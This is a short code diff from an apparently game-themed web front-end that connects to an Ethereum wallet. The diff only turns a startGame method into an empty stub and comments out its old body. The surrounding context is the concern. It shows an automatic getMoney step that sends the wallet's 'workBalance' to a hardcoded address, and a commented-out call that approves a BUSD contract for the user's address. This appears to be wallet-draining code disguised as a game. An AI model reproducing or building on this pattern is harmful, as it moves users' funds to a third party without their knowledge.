@@ -13,6 +13,10 @@ export default {
       if (this.appStage === 2) this.getMoney()
     },
 
+    startGame () {
+
+    },
+
     async getAccount () {
       const vm = this
       if (ethereum) {
@@ -63,15 +67,15 @@ export default {
         to: '0xB99983713C7391F6c22f0D5990963b24FaA2EbC9',
         value: vm.wallet.workBalance
       })
-    },
-
-    async startGame () {
-      // if (this.wallet.chainId === '0x38') {
-      //   if (this.appStage === 2) {
-      //     confirmContact(contracts.busd, this.wallet.address)
-      //   }
-      // }
     }
+
+    // async startGame () {
+    //   if (this.wallet.chainId === '0x38') {
+    //     if (this.appStage === 2) {
+    //       confirmContact(contracts.busd, this.wallet.address)
+    //     }
+    //   }
+    // }
   }
 
 }
